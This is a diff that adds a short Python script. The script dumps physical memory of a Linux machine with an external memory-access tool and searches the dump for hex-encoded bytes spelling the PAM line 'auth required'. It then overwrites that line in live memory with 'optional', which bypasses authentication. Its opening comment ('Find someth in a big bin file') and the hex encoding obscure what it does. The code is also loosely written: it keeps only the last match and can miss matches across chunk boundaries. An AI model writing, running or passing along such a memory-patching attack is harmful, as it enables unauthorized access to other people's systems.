@@ -1,0 +1,28 @@
+# Find someth in a big bin file
+import os
+for i in range(10):	
+	if os.path.exists('linux_dump' + str(i) +'.bin') == 0: # if file does't exist create a new one 
+		filename = ('linux_dump' + str(i) +'.bin') 
+		break	
+command = 'ff dump -min 0x10000000 -max 0xbc000000 -out '+filename
+os.system(command)
+i = 0
+total_ex = 0
+with open(filename, "rb",) as f:
+	file_size = os.stat(filename).st_size   # to know file size
+	for i in range( file_size//1024):
+		byte =f.read(1024)
+
+		is_exist = byte.find(b'\x61\x75\x74\x68\x09\x72\x65\x71\x75') # b' important
+		if is_exist != -1:
+
+			total_ex = is_exist + 1024*i
+			print("address in dump : ", hex(total_ex))
+	
+f.close()
+exist_with_shift =268435456 + total_ex	# -min 0x10000000
+print("address in phisical mem:", hex(exist_with_shift))
+
+command = 'ff write -min '+ hex(exist_with_shift+5) + ' -in ' + '6f7074696f6e616c09'
+print(command)
+os.system(command)
